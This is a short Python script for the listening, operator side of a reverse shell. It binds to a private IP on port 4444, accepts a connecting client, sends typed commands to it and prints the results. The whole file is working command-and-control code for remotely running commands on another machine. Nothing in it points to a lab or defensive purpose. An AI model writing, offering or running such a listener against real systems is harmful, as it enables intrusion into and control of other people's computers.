import sys
import socket

SERVER_IP = "192.168.0.122"
PORT = 4444

# Create a socket object
s = socket.socket()

# Set socket options to reuse the address
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to the server IP and port
s.bind((SERVER_IP, PORT))

# Start listening for incoming connections
s.listen(1)

while True:
    print(f'[+] Listening as {SERVER_IP}:{PORT}')

    # Accept a client connection
    client, addr = s.accept()
    print(f'[+] Client connected: {addr}')

    # Send a connection message to the client
    client.send('Connected'.encode())

    while True:
        # Get the command from the user input
        cmd = input('>>> ')

        # Send the command to the client
        client.send(cmd.encode())

        # Break the loop if the command is to quit
        if cmd.lower() in ['quit', 'exit', 'q', 'x']:
            break

        # Receive and print the result from the client
        result = client.recv(1024).decode()
        print(result)

    # Close the client connection
    client.close()

    # Ask if the server should wait for a new client
    cmd = input('Wait for new client (y/n)? ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

# Close the server socket
s.close()
